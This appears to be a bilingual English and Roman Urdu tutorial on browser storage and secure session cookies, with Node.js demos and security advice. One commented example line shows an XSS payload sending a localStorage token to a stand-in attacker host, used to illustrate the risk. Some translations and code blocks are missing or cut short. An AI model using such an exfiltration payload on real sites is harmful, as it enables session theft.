<BigIdea>
<Tr>
<En>
Every time a page loads, JavaScript starts from zero: variables are gone. To **remember** something (a dark-mode choice, items in a cart, who is logged in) the browser offers storage. **localStorage** is a simple key/value store for strings that stays until it's deleted, shared by every tab of the same site. **sessionStorage** has the same API but lives only as long as **one tab**. **Cookies** are small strings that the browser **sends to the server with every request** to that site; servers use them mainly for login sessions, and they can be locked away from JavaScript with `HttpOnly`. All three are scoped to the site (origin), all store **only strings**, and all are visible to anyone with access to the browser, so they're not for secrets. The key decision is **where** to put what: preferences in localStorage, per-tab drafts in sessionStorage, and authentication in an `HttpOnly`, `Secure`, `SameSite` cookie, never in localStorage, where any injected script could steal it.
</En>
<Ur>
Har dafa page load hone par JavaScript sifar se shuru hota hai: variables ghayab ho jate hain. Kuch **yaad rakhne** ke liye (dark mode ka intikhab, cart ke items, kaun login hai) browser storage deta hai. **localStorage** strings ke liye saada key/value store hai jo mitaye jane tak rehta hai, aur ek hi site ke har tab me mushtarka hai. **sessionStorage** ki API wahi hai magar ye sirf **ek tab** ki zindagi tak rehta hai. **Cookies** chhoti strings hain jo browser us site ki **har request ke saath server ko bhejta** hai; servers inhen zyada tar login sessions ke liye istemal karte hain, aur `HttpOnly` se inhen JavaScript se chhupaya ja sakta hai. Teeno site (origin) tak mehdood hain, teeno **sirf strings** rakhte hain, aur teeno browser tak pohanch rakhne wale har kisi ko nazar aate hain, isliye ye raazon ke liye nahi. Asal faisla ye hai ke **kya kahan** rakhein: preferences localStorage me, har tab ke drafts sessionStorage me, aur authentication `HttpOnly`, `Secure`, `SameSite` cookie me, kabhi localStorage me nahi, jahan koi bhi ghusaya hua script use chura sakta hai.
</Ur>
</Tr>

<Why>
<Tr>
<En>

- **Better experience**: remembered settings, carts that survive a refresh, drafts that aren't lost.
- **Login sessions** depend on cookies; understanding their attributes is essential security knowledge.
- **Wrong choices cause real incidents**: tokens in localStorage stolen by XSS, cookies sent to other sites (CSRF), huge cookies slowing every request.
- **Privacy laws** (GDPR, CCPA) care about what you store, which is why sites ask for cookie consent.

</En>
<Ur>

- **Behtar tajurba**: yaad rakhi settings, refresh ke baad bhi bacha cart, na khone wale drafts.
- **Login sessions** cookies par munhasir hain; un ke attributes samajhna zaroori security ilm hai.
- **Ghalat intikhab asli waqiat banata hai**: XSS se churaye gaye localStorage ke tokens, doosri sites ko bheji gayi cookies (CSRF), har request sust karti bari cookies.
- **Privacy qawaneen** (GDPR, CCPA) is ki parwah karte hain ke aap kya rakhte hain, isi liye sites cookie consent maangti hain.

</Ur>
</Tr>
</Why>
<When>
<Tr>
<En>

| Data | Best place |
| --- | --- |
| Login session / auth token | `HttpOnly; Secure; SameSite=Lax` cookie set by the server |
| Theme, language, "hide this banner" | localStorage (or a normal cookie if the server must render it) |
| Shopping cart for guests | localStorage (sync to the server after login) |
| Multi-step form progress in one tab | sessionStorage |
| Large or structured data (offline mode, many records) | IndexedDB |
| Passwords, card numbers, secret API keys | **nowhere in the browser** |

</En>

| --- | --- |

| Bara ya muntazam data (offline mode, bohot se records) | IndexedDB |
| Passwords, card numbers, raazdaraana API keys | **browser me kahin nahi** |

</Ur>
</Tr>
</When>
<How>
<Tr>
<En>

1. Choose the store by lifetime, sharing and whether the server needs it.
2. localStorage/sessionStorage: `setItem(key, JSON.stringify(value))` and `JSON.parse(getItem(key))` inside `try/catch` with a default.
3. Cookies for auth: set them **on the server** with `HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=…`.
4. Never store secrets; clear data on logout.

</En>
<Ur>

1. Zindagi, mushtarka hone aur server ki zaroorat ke hisaab se store chunein.
2. localStorage/sessionStorage: default ke saath `try/catch` ke andar `setItem(key, JSON.stringify(value))` aur `JSON.parse(getItem(key))`.
3. Auth ke liye cookies: **server par** `HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=…` ke saath set karein.
4. Kabhi raaz na rakhein; logout par data saaf karein.

</Ur>

## Picture it

<Tr>
<En>

Think of visiting a **gym**.

- **localStorage** is your **locker**: you put your things in, go home, come back next week, and they're still there. Only you can open it, but anyone who gets your key can too.
- **sessionStorage** is the **towel** they hand you at the door: yours for this visit only. Leave (close the tab) and it's gone. Go to a second room (another tab) and you get a separate towel.
- A **cookie** is your **membership wristband**: you don't hand it over; the staff **check it automatically every time** you walk through a door (every request). An `HttpOnly` wristband is fastened so you can't take it off and lend it to someone (JavaScript can't read it). `Secure` means it's only checked at secure doors (HTTPS). `SameSite` means another gym across the street can't make you walk in wearing it.
- Never write your bank PIN on the wristband or leave it in the locker.

</En>
<Ur>

**Gym** jane ka sochein.

- **localStorage** aap ka **locker** hai: aap cheezen rakhte hain, ghar jate hain, agle hafte wapas aate hain, aur wo wahin hoti hain. Sirf aap khol sakte hain, magar jis ke paas aap ki chabi aa jaye wo bhi.
- **sessionStorage** wo **tauliya** hai jo darwaze par diya jata hai: sirf is visit ke liye aap ka. Chale jayen (tab band) aur wo ghayab. Doosre kamre (doosra tab) me jayen to alag tauliya milta hai.
- **Cookie** aap ka **membership band** hai: aap ise dete nahi; staff har darwaze se guzarte waqt (har request) **khud check karta** hai. `HttpOnly` band aisa bandha hai ke aap use utaar kar kisi ko udhaar nahi de sakte (JavaScript parh nahi sakta). `Secure` ka matlab ye sirf mehfooz darwazon (HTTPS) par check hota hai. `SameSite` ka matlab saamne wala doosra gym aap ko ise pehne andar nahi bhej sakta.
- Apna bank PIN kabhi band par na likhein ya locker me na chhorein.

</Ur>
</Tr>

## Learn it step by step

<Tr>
<En>
Browser storage normally needs a browser, but Node.js 22 implements the **same Web Storage API** (behind a flag), saving localStorage to a file. That lets us run real code and see real output. In a browser, you'd write exactly the same lines without the flags.
</En>
<Ur>
Browser storage ko aam taur par browser chahiye, magar Node.js 22 **wahi Web Storage API** (flag ke peeche) banata hai, localStorage ko file me mehfooz karte hue. Is se hum asli code chala kar asli output dekh sakte hain. Browser me aap flags ke baghair bilkul yahi lines likhenge.
</Ur>
</Tr>

<Walkthrough>

<Step title="localStorage basics: everything is a string">

<Tr>
<En>
Five methods do it all: `setItem`, `getItem`, `removeItem`, `clear`, and `key(i)` with `length`. Watch what happens to a number and an object.
</En>
<Ur>
Paanch methods sab kuch karte hain: `setItem`, `getItem`, `removeItem`, `clear`, aur `length` ke saath `key(i)`. Dekhein number aur object ke saath kya hota hai.
</Ur>
</Tr>

```bash
rm -f store.json
cat > basics.mjs <<'EOF'
localStorage.setItem("theme", "dark");
localStorage.setItem("visits", 5);
localStorage.setItem("cart", { items: 2 });

console.log("theme:", localStorage.getItem("theme"));
console.log("visits:", localStorage.getItem("visits"), typeof localStorage.getItem("visits"));
console.log("cart:", localStorage.getItem("cart"));
console.log("missing:", localStorage.getItem("language"));
console.log("count:", localStorage.length, "| first key:", localStorage.key(0));

localStorage.removeItem("cart");
console.log("after remove:", localStorage.length, "items");
EOF
node --no-warnings --experimental-webstorage --localstorage-file=store.json basics.mjs
```

```text output
theme: dark
visits: 5 string
cart: [object Object]
missing: null
count: 3 | first key: cart
after remove: 2 items
```

<Happened>
<Tr>
<En>

- The number `5` came back as the **string** `"5"`. Use `Number(...)` when reading it (and beware `"5" + 1` = `"51"`).
- The object was converted with `String()` and became `"[object Object]"`: the data is **lost**. Objects need `JSON.stringify` (next step).
- A missing key returns `null`, not `undefined`, so `getItem("language") ?? "en"` is a neat default.
- The order of `key(i)` isn't guaranteed to match insertion order. Don't rely on it.
- In the browser you can see and edit all of this in DevTools → **Application** → Local Storage.

</En>
<Ur>

- Number `5` **string** `"5"` ban kar wapas aaya. Parhte waqt `Number(...)` lein (aur `"5" + 1` = `"51"` se hoshiyar).
- Object `String()` se badla aur `"[object Object]"` ban gaya: data **kho gaya**. Objects ko `JSON.stringify` chahiye (agla qadam).
- Ghayab key `undefined` nahi, `null` deti hai, isliye `getItem("language") ?? "en"` saaf default hai.
- `key(i)` ki tarteeb dakhil karne ki tarteeb se milne ki zamanat nahi. Is par bharosa na karein.
- Browser me ye sab DevTools → **Application** → Local Storage me dekh aur badal sakte hain.

</Ur>
</Tr>
</Happened>

</Step>

<Step title="Storing objects with JSON, and reading safely">

<Tr>
<En>
Wrap storage in two small helpers: `save` stringifies, `load` parses with a **fallback** for missing keys and for corrupt values (old app versions, users editing DevTools, half-written data).
</En>
<Ur>
Storage ko do chhote helpers me lapetein: `save` stringify karta hai, `load` ghayab keys aur kharab values (app ke purane versions, users ka DevTools me badalna, adhoora likha data) ke liye **fallback** ke saath parse karta hai.
</Ur>
</Tr>

```bash
cat > json.mjs <<'EOF'
function save(key, value) {
  localStorage.setItem(key, JSON.stringify(value));
}

function load(key, fallback) {
  const raw = localStorage.getItem(key);
  if (raw === null) return fallback;
  try {
    return JSON.parse(raw);
  } catch {
    console.log("  (corrupt value in " + key + ", using fallback)");
    return fallback;
  }
}

save("cart", { items: [{ id: 1, name: "Mug", qty: 2 }], updatedAt: "2026-11-12" });
const cart = load("cart", { items: [] });
console.log(cart.items[0].name, "x" + cart.items[0].qty);

localStorage.setItem("prefs", "{theme: dark");
console.log(load("prefs", { theme: "light" }));
console.log(load("never-saved", { theme: "light" }));
EOF
node --no-warnings --experimental-webstorage --localstorage-file=store.json json.mjs
```

```text output
Mug x2
  (corrupt value in prefs, using fallback)
{ theme: 'light' }
{ theme: 'light' }
```

<Happened>
<Tr>
<En>

- The cart survived the round trip as a real object with nested arrays.
- The broken `prefs` value would have thrown a `SyntaxError` and crashed the page on load; the helper fell back to defaults instead.
- JSON can't store `Date` objects (they become strings), `Map`, `Set`, `undefined` or functions. Convert them explicitly.
- For important data, also store a **version** (`{ v: 2, items: [...] }`) so a new app release can migrate or discard old shapes. Validating with a zod schema (TypeScript module) is even better.

</En>
<Ur>

- Cart aane jane ke baad bhi nested arrays wala asli object raha.
- Toota `prefs` value `SyntaxError` throw karta aur load par page crash kar deta; helper ne is ke bajaye defaults par wapas aa gaya.
- JSON `Date` objects (strings ban jate hain), `Map`, `Set`, `undefined` ya functions nahi rakh sakta. Inhen saaf taur par badlein.
- Ahem data ke liye **version** bhi rakhein (`{ v: 2, items: [...] }`) taa ke app ki nayi release purani shakalen muntaqil ya radd kar sake. zod schema se validate karna aur bhi behtar hai (TypeScript module).

</Ur>
</Tr>
</Happened>

</Step>

<Step title="localStorage lasts; sessionStorage doesn't">

<Tr>
<En>
Let's "reload the page" three times by running the same script three times. Each run counts visits in localStorage and views in sessionStorage. (In Node, each run is like a fresh tab: sessionStorage starts empty.)
</En>
<Ur>
Ek hi script teen dafa chala kar teen dafa "page reload" karte hain. Har run localStorage me visits aur sessionStorage me views ginta hai. (Node me har run naye tab jaisa hai: sessionStorage khaali shuru hota hai.)
</Ur>
</Tr>

```bash
rm -f store.json
cat > persist.mjs <<'EOF'
const visits = Number(localStorage.getItem("visits") ?? 0) + 1;
localStorage.setItem("visits", visits);

const tabViews = Number(sessionStorage.getItem("tabViews") ?? 0) + 1;
sessionStorage.setItem("tabViews", tabViews);

console.log("localStorage visits:", visits, "| sessionStorage tabViews:", tabViews);
EOF
for run in 1 2 3; do
  node --no-warnings --experimental-webstorage --localstorage-file=store.json persist.mjs
done
```

```text output
localStorage visits: 1 | sessionStorage tabViews: 1
localStorage visits: 2 | sessionStorage tabViews: 1
localStorage visits: 3 | sessionStorage tabViews: 1
```

<Happened>
<Tr>
<En>

- localStorage kept counting across runs: it was saved (here in `store.json`; in a browser, on disk in the profile).
- sessionStorage restarted at 1 every time, because each run was a new "tab".
- In a real browser, sessionStorage **does** survive reloads and back/forward navigation **within the same tab**; it disappears when the tab closes, and a new tab (even of the same page) gets its own. "Duplicate tab" copies it once.
- Both are per **origin**: `https://shop.example.com` can't read `https://blog.example.com`'s storage, and `http://` and `https://` versions of a site are separate.

</En>
<Ur>

- localStorage runs ke darmiyan ginta raha: ye mehfooz hua (yahan `store.json` me; browser me profile ke andar disk par).
- sessionStorage har dafa 1 se dobara shuru hua, kyun ke har run naya "tab" tha.
- Asli browser me sessionStorage **usi tab ke andar** reloads aur back/forward navigation me **bacha rehta** hai; tab band hone par ghayab hota hai, aur naya tab (usi page ka bhi) apna alag leta hai. "Duplicate tab" use ek dafa copy karta hai.
- Dono **origin** ke hisaab se hain: `https://shop.example.com` `https://blog.example.com` ka storage nahi parh sakta, aur site ke `http://` aur `https://` versions alag hain.

</Ur>
</Tr>
</Happened>

</Step>

<Step title="Storage can be full or unavailable">

<Tr>
<En>
Storage is limited (around 5 MB per origin for localStorage) and sometimes **not available at all**: some privacy modes, disabled storage, and sandboxed iframes block it. Writing too much throws `QuotaExceededError`.
</En>
<Ur>
Storage mehdood hai (localStorage ke liye fi origin taqreeban 5 MB) aur kabhi **bilkul dastiyab nahi** hota: kuch privacy modes, band kiya storage, aur sandboxed iframes ise rok dete hain. Bohot zyada likhna `QuotaExceededError` throw karta hai.
</Ur>
</Tr>

```bash
cat > quota.mjs <<'EOF'
try {
  localStorage.setItem("big", "x".repeat(20 * 1024 * 1024));
  console.log("stored 20 MB?!");
} catch (error) {
  console.log(error.name + ":", error.message);
}
EOF
node --no-warnings --experimental-webstorage --localstorage-file=store.json quota.mjs
```

```text output
QuotaExceededError: Setting the value exceeded the quota
```

<Tr>
<En>
And this live preview runs inside a **sandboxed** frame on this page, so it can't use storage at all. That's exactly why you should check first:
</En>
<Ur>
Aur ye live preview is page par **sandboxed** frame ke andar chalta hai, isliye bilkul storage istemal nahi kar sakta. Isi liye pehle check karna chahiye:
</Ur>
</Tr>

```html preview-js h=110
<pre id="out"></pre>
<script>
  function storageAvailable() {
    try {
      const k = "__test__";
      localStorage.setItem(k, k);
      localStorage.removeItem(k);
      return true;
    } catch (error) {
      document.querySelector("#out").textContent = "localStorage unavailable: " + error.name + "\n" + error.message;
      return false;
    }
  }
  if (storageAvailable()) document.querySelector("#out").textContent = "localStorage works here";
</script>
```

<Happened>
<Tr>
<En>

- In the preview you'll see `localStorage unavailable: SecurityError`, because the preview frame has no real origin. Save the same code as an `.html` file served from a local server and it prints "localStorage works here".
- Your app must **keep working** without storage: catch errors, fall back to in-memory defaults, and don't crash.
- Never store large data (images, big API responses) in localStorage. It's synchronous (it blocks the main thread) and small. Use IndexedDB or the Cache API instead.

</En>
<Ur>

- Preview me aap ko `localStorage unavailable: SecurityError` dikhega, kyun ke preview frame ka koi asli origin nahi. Yahi code `.html` file ke taur par local server se chalayen to ye "localStorage works here" print karta hai.
- Aap ki app ko storage ke baghair bhi **chalte rehna** chahiye: errors pakrein, memory ke defaults par wapas aayen, aur crash na karein.
- localStorage me kabhi bara data (images, bare API responses) na rakhein. Ye synchronous hai (main thread rokta hai) aur chhota hai. Is ke bajaye IndexedDB ya Cache API lein.

</Ur>
</Tr>
</Happened>

<Step title="Cookies: the server sets them, the browser sends them back">

<Tr>
<En>
Cookies usually start on the **server**: a response includes a `Set-Cookie` header. From then on, the browser **automatically** attaches a `Cookie` header to every request to that site. This Node demo plays both sides: a server with `/login` and `/me`, and a client that sends the cookies back like a browser would.
</En>
<Ur>
Cookies aam taur par **server** par shuru hoti hain: response me `Set-Cookie` header hota hai. Us ke baad browser us site ki har request ke saath **khud** `Cookie` header laga deta hai. Ye Node demo dono taraf ka kirdar ada karta hai: `/login` aur `/me` wala server, aur aisa client jo browser ki tarah cookies wapas bhejta hai.
</Ur>
</Tr>

```bash
cat > cookies.mjs <<'EOF'
import http from "node:http";

const sessions = new Map();

const server = http.createServer((req, res) => {
  const cookies = Object.fromEntries(
    (req.headers.cookie ?? "").split("; ").filter(Boolean).map((pair) => pair.split("="))
  );

  if (req.url === "/login") {
    const id = "s_7f3a9c";
    sessions.set(id, { user: "sara@example.com" });
    res.setHeader("set-cookie", [
      "session=" + id + "; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600",
      "theme=dark; Path=/; Max-Age=31536000",
    ]);
    return res.end("logged in");
  }

  if (req.url === "/me") {
    const session = sessions.get(cookies.session);
    res.statusCode = session ? 200 : 401;
    return res.end(session ? "hello " + session.user + " (theme: " + cookies.theme + ")" : "not logged in");
  }
});

server.listen(0, async () => {
  const base = "http://localhost:" + server.address().port;

  const login = await fetch(base + "/login");
  console.log("Set-Cookie headers from the server:");
  for (const c of login.headers.getSetCookie()) console.log("  " + c);

  const cookieHeader = login.headers.getSetCookie().map((c) => c.split(";")[0]).join("; ");
  console.log("Cookie header the browser sends back:", cookieHeader);

  const me = await fetch(base + "/me", { headers: { cookie: cookieHeader } });
  console.log("/me with cookie:   ", me.status, await me.text());

  const anon = await fetch(base + "/me");
  console.log("/me without cookie:", anon.status, await anon.text());
  server.close();
});
EOF

```

<Step title="Cookie attributes that matter">

<Tr>
<En>

| Attribute | Meaning | Recommended for sessions |
| --- | --- | --- |
| `HttpOnly` | JavaScript (`document.cookie`) can't read it | **yes**: XSS can't steal it |
| `Secure` | Only sent over HTTPS (localhost is allowed) | **yes** |
| `SameSite=Lax` | Not sent on cross-site sub-requests (images, fetch, POST forms from other sites); sent when the user clicks a link to your site | **yes**, the good default |
| `SameSite=Strict` | Never sent from another site, even on link clicks | for very sensitive actions |
| `SameSite=None` | Sent cross-site; **requires** `Secure` | only for embeds/third-party use |
| `Max-Age=3600` / `Expires=…` | Lifetime; without it, deleted when the browser closes | set a sensible lifetime |
| `Path=/` | Which paths receive it | usually `/` |
| `Domain=example.com` | Share with subdomains; omit to limit to the exact host | omit unless needed |
| `__Host-` prefix | Name like `__Host-session` forces `Secure`, `Path=/`, no `Domain` | strongest choice |

To **delete** a cookie, the server sends the same name and path with `Max-Age=0`.

</En>
<Ur>

| Attribute | Matlab | Sessions ke liye mashwara |
| --- | --- | --- |
| `HttpOnly` | JavaScript (`document.cookie`) ise parh nahi sakta | **haan**: XSS ise chura nahi sakta |
| `Secure` | Sirf HTTPS par jati hai (localhost ki ijazat hai) | **haan** |
| `SameSite=Lax` | Cross-site sub-requests (images, fetch, doosri sites ke POST forms) par nahi jati; jab user aap ki site ka link dabaye tab jati hai | **haan**, achha default |
| `SameSite=Strict` | Doosri site se kabhi nahi jati, link click par bhi nahi | bohot hassas amal ke liye |
| `SameSite=None` | Cross-site jati hai; `Secure` **zaroori** | sirf embeds/third-party istemal |
| `Max-Age=3600` / `Expires=…` | Zindagi; is ke baghair browser band hone par mit jati hai | maqool zindagi set karein |
| `Path=/` | Kaun se paths ise lete hain | aam taur par `/` |
| `Domain=example.com` | Subdomains se share; chhor dein to bilkul usi host tak | zaroorat na ho to chhor dein |
| `__Host-` prefix | `__Host-session` jaisa naam `Secure`, `Path=/`, bina `Domain` lazmi karta hai | sab se mazboot intikhab |

Cookie **mitane** ke liye server wahi naam aur path `Max-Age=0` ke saath bhejta hai.

</Ur>

<Step title="document.cookie from JavaScript">

<Tr>
<En>
JavaScript can read and write **non-HttpOnly** cookies through `document.cookie`, a strange API: reading returns **one string** of all visible cookies; **assigning** sets **one** cookie (it doesn't replace the others). Values should be encoded. Here are small helpers, run on the string format `document.cookie` uses.
</En>
<Ur>
JavaScript **ghair HttpOnly** cookies `document.cookie` se parh aur likh sakta hai, ek ajeeb API: parhna tamam nazar aane wali cookies ki **ek string** deta hai; **assign** karna **ek** cookie set karta hai (baqi ko nahi badalta). Values encode honi chahiyen. Ye chhote helpers hain, `document.cookie` wali string ki shakal par chalaye gaye.
</Ur>
</Tr>

```javascript
// What document.cookie returns: all readable cookies in one string
const cookieString = "theme=dark; cartCount=3; greeting=Hello%2C%20Emma%21";

function parseCookies(str) {
  return Object.fromEntries(
    str.split("; ").filter(Boolean).map((part) => {
      const i = part.indexOf("=");
      return [part.slice(0, i), decodeURIComponent(part.slice(i + 1))];
    })
  );
}

// What you would assign to document.cookie to set one cookie
function cookieToSet(name, value, { maxAge, path = "/", sameSite = "Lax" } = {}) {
  let c = name + "=" + encodeURIComponent(value) + "; Path=" + path + "; SameSite=" + sameSite;
  if (maxAge !== undefined) c += "; Max-Age=" + maxAge;
  return c;
}

console.log(parseCookies(cookieString));
console.log(cookieToSet("greeting", "Hello, Emma!", { maxAge: 86400 }));
console.log(cookieToSet("cartCount", "", { maxAge: 0 }), "  ← deletes it");
```

```text output
{ theme: 'dark', cartCount: '3', greeting: 'Hello, Emma!' }
greeting=Hello%2C%20Emma!; Path=/; SameSite=Lax; Max-Age=86400
cartCount=; Path=/; SameSite=Lax; Max-Age=0   ← deletes it
```

<Tr>
<En>

- In a browser: `parseCookies(document.cookie)` reads them and `document.cookie = cookieToSet(...)` writes one.
- `encodeURIComponent` is needed because `;`, `,`, spaces and some other characters would break the format.

- Modern browsers also offer the async **Cookie Store API** (`await cookieStore.get("theme")`), but it isn't available everywhere yet. In practice, prefer setting cookies on the server.

</En>
<Ur>

- Browser me: `parseCookies(document.cookie)` unhen parhta hai aur `document.cookie = cookieToSet(...)` ek likhta hai.

- `HttpOnly` cookies `document.cookie` me **kabhi** nazar nahi aatin. Yahi maqsad hai: XSS hamla unhen parh nahi sakta.
- Jadeed browsers async **Cookie Store API** (`await cookieStore.get("theme")`) bhi dete hain, magar ye abhi har jagah nahi. Amali taur par cookies server par set karna pasand karein.

<Step title="Keeping tabs in sync: the storage event">

<Tr>
<En>

When one tab changes localStorage, **other tabs** of the same origin receive a `storage` event. Use it to keep the UI consistent, for example logging out everywhere or updating a cart badge:

```text
// in every tab
window.addEventListener("storage", (event) => {
  if (event.key === "cart") {
    const cart = event.newValue ? JSON.parse(event.newValue) : { items: [] };
    renderCartBadge(cart.items.length);
  }
  if (event.key === "logout-at") {
    location.href = "/login";       // logged out in another tab
  }
});
```

</En>
<Ur>

<Step title="Where should the login token go?">

<Tr>
<En>

This is the most important decision in this lesson. Compare the two common designs:

| | Token in localStorage + `Authorization` header | Session id in `HttpOnly` cookie |
| --- | --- | --- |
| Can injected JavaScript (XSS) read it? | **yes**: one bad script and the token is gone | **no** |
| Sent automatically | no, your code adds it | yes, by the browser |
| CSRF risk | low | handled by `SameSite=Lax` + CSRF tokens for risky actions |
| Works for mobile apps / other servers | easily | needs a little more setup |
| Logout / revoke | hard if it's a long-lived JWT | delete the server session |

For websites, the recommended default is an **`HttpOnly; Secure; SameSite=Lax` cookie** containing a session id (or a short-lived token), set by your server or auth library (Auth.js, Lucia-style sessions, Clerk, Supabase in cookie mode). XSS is still a serious bug, but it can no longer **steal** the session to use elsewhere.

</En>
<Ur>

Is lesson ka sab se ahem faisla yahi hai. Do aam designs ka muqabla karein:

| | localStorage me token + `Authorization` header | `HttpOnly` cookie me session id |
| --- | --- | --- |
| Kya ghusaya hua JavaScript (XSS) ise parh sakta hai? | **haan**: ek bura script aur token gaya | **nahi** |
| Khud bheja jata hai | nahi, aap ka code jorta hai | haan, browser |
| CSRF ka khatra | kam | `SameSite=Lax` + khatarnak amal ke liye CSRF tokens se sambhala |
| Mobile apps / doosre servers ke liye | aasani se | thora zyada setup |
| Logout / mansookhi | lambi zindagi wala JWT ho to mushkil | server session mita dein |

</Ur>

## Common mistakes

<Compare>
<Bad title="Storing an object directly">

```text
localStorage.setItem("cart", cart);              // saves "[object Object]"
const items = localStorage.getItem("cart").items; // undefined
```

</Bad>
<Good title="JSON in, JSON out, with a fallback">

```text
localStorage.setItem("cart", JSON.stringify(cart));

```

</Good>
</Compare>

<Compare>
<Bad title="Auth token in localStorage">

```text
localStorage.setItem("token", jwt);
fetch("/api/me", { headers: { authorization: "Bearer " + localStorage.getItem("token") } });
// any XSS: fetch("https://evil.example/?t=" + localStorage.token)
```

</Bad>
<Good title="Server sets an HttpOnly cookie">

```text
Set-Cookie: __Host-session=s_7f3a9c; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=86400
fetch("/api/me");   // the browser attaches the cookie; JavaScript never sees it
```

</Good>
</Compare>

<Tr>
<En>

More mistakes to avoid:

- **Forgetting values are strings**: `getItem("count") + 1` gives `"51"`.
- **Not handling `null`, corrupt JSON or unavailable storage**, which crashes the app on load.
- **Large data in localStorage** (blocks the main thread; use IndexedDB).
- **Large or many cookies**, which are sent with every request.
- **`SameSite=None` without `Secure`**: browsers reject it.
- **Reading localStorage during server rendering** in Next.js (`localStorage is not defined`): access it in `useEffect` or client components only.
- **Keeping personal data after logout** on shared devices.

</En>
<Ur>

Bachne wali mazeed ghaltiyan:

- **Bhoolna ke values strings hain**: `getItem("count") + 1` `"51"` deta hai.
- **`null`, kharab JSON ya ghair dastiyab storage na sambhalna**, jo load par app crash karta hai.
- **localStorage me bara data** (main thread rokta hai; IndexedDB lein).
- **Bari ya bohot si cookies**, jo har request ke saath jati hain.
- **`Secure` ke baghair `SameSite=None`**: browsers ise radd karte hain.
- Next.js me **server rendering ke dauran localStorage parhna** (`localStorage is not defined`): sirf `useEffect` ya client components me istemal karein.
- Mushtarka devices par **logout ke baad zaati data rakhna**.

</Ur>

<DeepDive title="More browser storage">

**IndexedDB.** An asynchronous, transactional database in the browser for large and structured data (objects, indexes, blobs). The raw API is verbose; small libraries like `idb` or Dexie make it pleasant. It's what offline-first apps, email clients and PWAs use.

**Cache API.** Stores whole HTTP responses (`caches.open("v1")`), mainly used by service workers for offline support.

**Storage quotas and eviction.** Browsers give each origin a share of disk space and may evict data under storage pressure. `navigator.storage.estimate()` reports usage; `navigator.storage.persist()` asks to protect it.

**Third-party cookies.** Cookies set by a different site embedded in yours (ads, trackers). Browsers increasingly block or partition them (Safari and Firefox by default); Chrome has restricted them and offers CHIPS (`Partitioned` cookies) for legitimate embeds.

**Cookies in Next.js.** Server components and route handlers read cookies with `cookies()` from `next/headers`; setting them happens in server actions, route handlers or middleware.

**Signed and encrypted cookies.** If you must keep data in a cookie (not just an id), sign it (HMAC) so users can't edit it, and encrypt it if it's private. Libraries like iron-session do this.

**Private browsing.** Storage works but is wiped when the private window closes; quotas may be smaller.

</DeepDive>

<DeepDive title="Real world: the token that walked away">

A startup's dashboard stored a long-lived JWT (valid for 30 days) in localStorage and sent it as a `Bearer` header. A marketing team added a third-party "chat widget" script from a small vendor.

Months later, that vendor's CDN was compromised. The modified widget script ran on every page that included it, and one line sent `localStorage` contents to the attacker. Within hours, attackers used customers' tokens from their own machines to download invoices and contact lists. Because the JWTs were self-contained and valid for 30 days, logging out didn't revoke them.

The response:

1. Rotated the JWT signing key, which invalidated every token and forced everyone to log in again.
2. Moved to **server-side sessions** in an `__Host-session` cookie: `HttpOnly; Secure; SameSite=Lax`, eight-hour lifetime, revocable from an admin page.
3. Added a **Content Security Policy** allowing scripts only from their own domain and a short list of vendors, with **Subresource Integrity** hashes for fixed third-party files.
4. Cleared localStorage of anything user-specific, keeping only UI preferences.

A similar compromise later would still be serious, but the script could no longer carry away credentials that worked from anywhere for a month.

</DeepDive>

<DeepDive title="Security lens">

- **Everything in browser storage is readable by the user and by any script on your origin.** Never store passwords, card data, secret API keys or long-lived tokens there.
- **Session cookies**: `HttpOnly`, `Secure`, `SameSite=Lax` (or `Strict`), short `Max-Age`, `__Host-` prefix, regenerate the session id after login to prevent session fixation.
- **CSRF**: `SameSite=Lax` blocks most cross-site POSTs; add CSRF tokens or check the `Origin` header for state-changing requests, especially if you need `SameSite=None`.
- **Treat stored data as untrusted input**: users (or malware) can edit localStorage; validate it and insert it with `textContent`.
- **Clear on logout**, and avoid caching personal data on shared devices.
- **Privacy**: non-essential cookies (analytics, ads) generally need consent under GDPR-style laws.

</DeepDive>

<DeepDive title="Interview questions">

<QA q="What are the differences between cookies, localStorage and sessionStorage?">
Cookies are small, can have an expiry, can be HttpOnly, and are sent to the server with every matching request. localStorage stores strings per origin persistently until cleared and is shared across tabs. sessionStorage has the same API but is scoped to a single tab and cleared when it closes. Neither Web Storage type is sent to the server automatically.
</QA>

<QA q="Where should you store an authentication session in a web app and why?">
In a cookie set by the server with HttpOnly, Secure and SameSite attributes, usually containing a session id. HttpOnly prevents JavaScript, including injected scripts, from reading it, Secure limits it to HTTPS, and SameSite reduces CSRF. Storing tokens in localStorage exposes them to theft through XSS.
</QA>

<QA q="What does the SameSite cookie attribute do?">
It controls whether the cookie is sent with cross-site requests. Strict never sends it cross-site, Lax sends it on top-level navigations such as clicking a link but not on cross-site subresource requests or form posts, and None sends it in all contexts but requires Secure.
</QA>

<QA q="How do you store an object in localStorage?">
Serialize it with JSON.stringify when saving and JSON.parse when reading, handling a null result for missing keys and catching parse errors for corrupted data, with a sensible default.
</QA>

<QA q="How can tabs be kept in sync when localStorage changes?">
Listen for the storage event on window in each tab. It fires in other tabs of the same origin when a value changes, providing the key, old value and new value. BroadcastChannel is an alternative for sending messages without storing data.
</QA>
